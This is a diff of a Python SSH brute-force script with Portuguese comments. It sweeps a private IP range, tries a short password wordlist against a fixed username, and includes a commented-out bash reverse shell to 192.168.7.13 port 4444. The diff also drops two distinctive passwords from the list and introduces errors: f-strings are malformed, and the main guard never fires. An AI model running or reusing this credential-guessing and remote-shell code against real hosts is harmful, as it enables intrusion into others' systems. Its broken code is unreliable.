@@ -8,7 +8,7 @@ def ssh_brute_force(ip,username,password_list):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip,username=username,password=password,timeout=5)
-   print(f"[+]Acesso bem-sucedido em {ip}com a senha:{password}")
+   print("f[+]Acesso bem-sucedido em {ip}com a senha:{password}")
 
   # Disparar reverse shell
   #comando_reverse ="bash -i >& /dev/tcp/192.168.7.13/4444 0>&1"
@@ -24,12 +24,12 @@ def ssh_brute_force(ip,username,password_list):
 def scan_network():
  faixa_ips=["192.168.7."+str(i)for i in range(5,130)] #IPs de 192.168.1.10 até 192.168.1.130
  username="cristle"
- wordlist=["admin","1234","password","oddin3","Kadosh73.","root123","123456"]
+ wordlist=["admin","1234","password","root123","123456"]
 
  for ip in faixa_ips:
   ip_vulneravel,senha=ssh_brute_force(ip,username,wordlist)
   if ip_vulneravel:
-     print(f"[+]Máquina vulneravel encontrada:{ip_vulneravel}")
+     print("f[+]Máquina vulneravel encontrada:{ip_vulneravel}")
 
 if __name__ == "__name__":
   scan_network()
